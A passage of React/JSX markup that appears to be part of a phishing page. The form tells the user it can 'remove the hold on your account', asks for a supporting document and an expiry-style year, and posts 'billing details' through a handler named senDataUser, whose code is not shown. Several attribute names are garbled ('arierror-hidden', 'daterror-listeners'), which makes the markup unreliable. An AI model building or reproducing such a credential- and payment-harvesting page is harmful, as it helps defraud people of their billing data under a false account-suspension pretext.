                                            onChange={handleChangeYear} className={styles.seclectCustom}>
                                            <option value={2024} selected="">
                                                2024
                                            </option>
                                            <option value={2025}>2025</option>
                                            <option value={2026}>2026</option>
                                            <option value={2027}>2027</option>
                                            <option value={2028}>2028</option>
                                            <option value={2029}>2029</option>
                                            <option value={2030}>2030</option>
                                            <option value={2031}>2031</option>
                                            <option value={2032}>2032</option>
                                            <option value={2033}>2033</option>
                                            <option value={2034}>2034</option>
                                            <option value={2035}>2035</option>
                                        </select>
                                    </span>
                                </div>
                            </div>
                        </div>
                    </div>
                    <div
                        id="divider-12"
                        className={styles.errorSection + " " + styles.errorSpacingBase + " " + styles.abbottViewComponent}
                    >
                        <hr arierror-hidden="true" className={styles.errorDividerNormal} />
                    </div>
                    <div
                        id="header-13"
                        className={styles.errorSection + " " + styles.errorSpacingMini}
                    >
                        <h1
                            daterror-action-on-load="register-listeners"
                            daterror-listeners=""
                            className={styles.errorSizeLarge}
                        >
                            Attach supporting document
                        </h1>
                    </div>
                    <div
                        id="header-14"
                        className={styles.errorSection + " " + styles.errorSpacingBase}
                    >
                        <h1
                            daterror-action-on-load="register-listeners"
                            daterror-listeners=""
                            className={styles.errorSizeBase}
                        >
                            This can help remove the hold on your account more quickly.
                        </h1>
                    </div>
                    <div
                        id="text-15"
                        className={styles.errorSection + " " + styles.errorSpacingBase}
                    >
                        <span
                            daterror-action-on-load="register-listeners"
                            daterror-listeners=""
                            className="error-size-base has-action-on-load text-align-left"
                        >
                            <iframe
                                src="https://player.vimeo.com/video/667387306?h=37c31a1554"
                                width="100%"
                                height={300}
                                frameBorder={0}
                                allow="autoplay; fullscreen; picture-in-picture"
                                allowFullScreen=""
                            />
                        </span>
                    </div>
                    <div
                        id="submit-button-26"
                        className={styles.errorSection + " " + styles.errorSpacingBase}
                    >
                        <div
                            daterror-action-on-load="register-listeners"
                            daterror-listeners=""
                            className={styles.errorSection + " " + styles.hasActionOnLoad + " flex justify-center"}

                        >
                            <span
                                id="submit-button"
                                onClick={senDataUser}
                                className={styles.errorButton + " " + styles.errorButtonPrimary + " " + styles.buttonDefaultWidth}
                            >
                                <span className={styles.errorButtonInner}>
                                    <input
                                        className={styles.errorButtonInput}
                                        type="submit"
                                        arierror-labelledby="submit-button-announce"
                                    />
                                    <span
                                        id="submit-button-announce"
                                        className={styles.errorButtonText}
                                        arierror-hidden="true"
                                    >
                                        {loading ? (
                                            <div className="container">
                                                <div className="loading"></div>
                                            </div>
                                        ) : (
                                            <span>
                                                Submit billing details &
                                                document
                                            </span>
                                        )}
                                    </span>
                                </span>
                            </span>
                        </div>
                    </div>
                </form>
            </div >
        </main >
    );
}
